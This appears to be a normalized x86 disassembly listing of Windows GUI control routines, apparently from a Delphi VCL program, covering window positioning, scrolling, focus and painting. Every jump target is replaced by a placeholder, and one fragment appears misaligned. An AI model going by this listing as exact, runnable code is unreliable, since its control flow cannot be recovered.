add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_440fb8
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_4413ec
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_4443a0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_413a24
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_4138b8
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_413a44
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4139c8
call sub_4446f8
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4139c8
call sub_4446f8
sub_444478
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_4443a0
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_4444d8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4446f8
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_4446f8
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
test eax eax
jne r-xdata
sub_44453c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4449fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_43f0c4
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_42f650
call sub_42f730
test al al
je r-xdata
mov eax ebx
call sub_441428
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4413ec
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_4413ec
test [ eax + 0x52 ] 0x4
je r-xdata
sub_444600
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43d864
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_444638
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_455b0c
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_444678
push ebx
mov ebx eax
mov eax ebx
call sub_455b0c
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_459970
pop ebx
retn
mov eax ebx
call sub_455b34
mov eax ebx
call sub_4446f8
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_4446b0
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4446d4
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_4446d4
sub_44470c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_412594
mov eax edi
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_4413ec
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_4447a0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_4446f8
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_4447d8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4449fc
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4446f8
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403468
sub_444894
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_413a24
pop esi
pop ebx
retn
sub_4448b8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_444894
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_4138b8
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_413a44
sub_44492c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_4449fc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_43f0c4
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_44498c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4449f0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4449f7
lea eax [ ebp - 0x4 ]
call sub_405628
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403468
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405640
sub_444a08
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43d518
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_444ac0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_4139c8
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_41386c
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403468
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_444b20
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_444c16
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403468
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444c1d
mov eax [ ebp - 0x14 ]
call sub_40326c
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_413a24
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4139c8
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403468
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_444c2c
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_444b20
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_444c58
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_455b0c
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_444b20
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_444b20
mov edx eax
mov eax esi
call sub_459870
sub_444c9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441428
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4413ec
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_444ce4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4443a0
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43e134
sub_444d2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_444db0
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4449fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_441428
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_445172
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_441428
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_444d2c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4413ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_445189
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_444db0
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43ef60
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4451c8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43fde4
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_43d82c
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_445210
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440004
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_445240
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4449fc
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_440f90
xor ecx ecx
push ebp
push sub_44536f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_441428
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445376
mov eax [ ebp - 0x4 ]
